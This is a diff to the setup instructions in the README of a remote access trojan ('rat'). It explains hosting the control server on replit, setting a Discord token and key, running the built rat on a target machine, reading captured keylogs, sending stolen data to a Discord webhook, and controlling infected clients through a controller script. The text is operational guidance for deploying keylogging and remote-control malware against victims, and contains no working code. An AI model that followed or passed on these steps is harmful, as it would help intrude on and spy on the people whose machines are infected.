@@ -29,8 +29,11 @@ This tool is able to do all of these tasks, all at once
 
 Setup can be done pretty quickly!<br>
  - Upload the contents of the server folder into replit
+ - delete `main.py` and remame `server.py` to `main.py`
+
  - Copy and paste example.json into the replit secret manager to set the `ENV` variables, Remember to replace the env variables with your own information
     - For the `key` variable go to <a src="https://emn178.github.io/online-tools/sha256.html">this link</a> and input whatever password you want, copy the output then set the `ENV` variable to the output from the site 
+    
         - This is the same key you will use when building the rat
 
     - For `t` replace it with your a discord token, so it can dynamically
@@ -45,7 +48,7 @@ Setup can be done pretty quickly!<br>
 
  - Then run it on a target machine and it should connect
 
- - To see your keylogs check the logs folder on the replit, everything else will be sent to your discord webhook and finally run `Controller.py` to control any connected clients
+ - To see your keylogs check the logs folder on the replit, everything else will be sent to your discord webhook and finally run `controller.py` to control any connected clients
 
 ![image](https://user-images.githubusercontent.com/78031685/212566168-1d2ab61c-843b-4c2b-9ad9-48fc915788de.png)
 
